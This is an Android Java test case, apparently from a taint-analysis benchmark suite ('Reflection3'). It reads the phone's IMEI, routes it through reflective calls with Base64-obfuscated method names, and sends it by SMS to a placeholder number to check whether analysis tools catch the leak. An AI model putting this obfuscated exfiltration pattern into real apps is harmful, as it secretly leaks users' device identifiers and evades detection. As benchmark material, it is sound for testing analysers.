package de.ecspride;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

//added 220525
import android.util.Base64;
import android.util.Log;

/**
 * @testcase_name Reflection3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A class instance is created using reflection. Sensitive data is stored
 * 	using a setter in this class, read back using a getter and then leaked. No type information
 *  on the target class is used.
 * @dataflow onCreate: source -> o.setImei() -> o.getImei() -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to reflective invocations of methods without
 * 	type information on the target class.
 */
public class MainActivity extends Activity {


	private String encrypted = "Z2V0SW1laQ==";  //getImei Base64.encodeToString("getImei".getBytes(), Base64.DEFAULT)
	public String base64decrypt(String encrypted){
		String dec=new String(Base64.decode(encrypted,Base64.DEFAULT));
		return dec;
	}

	public String staticDec(String in){
		int i=0;
		for (i=0;i<3;i++){
			in=in+"t";
		}
		return in;
	}
	public String testMethod(String encrypted){
		String dec="xx";
		dec = staticDec(encrypted);
		return dec;
	}


	String[] strArray={"getImei","2","3"};
	String[][] strArray2={{"getImei","2","3"},{"4","5","6"}};
	String[][] strArray2_static={strArray,strArray};

	public String retuStr(){
		return "getImei";
	}
	public String retuStr2(String input){
		return input;
	}
	public String retuStr3(String input){
		input = "getImei";
		return input;
	}

	public String retuStr4(String input){
		String dec=new String("getImei");
		return dec;
	}

	public String retuStr5(String input){
		input = input + "i";
		return input;
	}

	public String retuStr6(){
		String dec="xx";
		dec = base64decrypt(encrypted);
		return dec;
	}

	@SuppressWarnings({ "unchecked", "rawtypes" })
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Log.v("testbase64:","\'"+base64decrypt(encrypted)+"\'");//经过测试，可以解出getImei
		try {
			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			String imei = telephonyManager.getDeviceId(); //source

			Class c = Class.forName("de.ecspride.ReflectiveClass");
			Object o = c.newInstance();
			Method m = c.getMethod("setIme" + "i", String.class);
			m.invoke(o, imei);
			
			Method m2 = c.getMethod(strArray2_static[0][0]); //"getImei"  base64decrypt(encrypted) strArray[0]

			Object[] obj =new Object[2];
			obj[0]="2016";
			obj[1]=2012;

			String s = (String) m2.invoke(o);
			
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, s, null, null);   //sink, leak
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}	
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
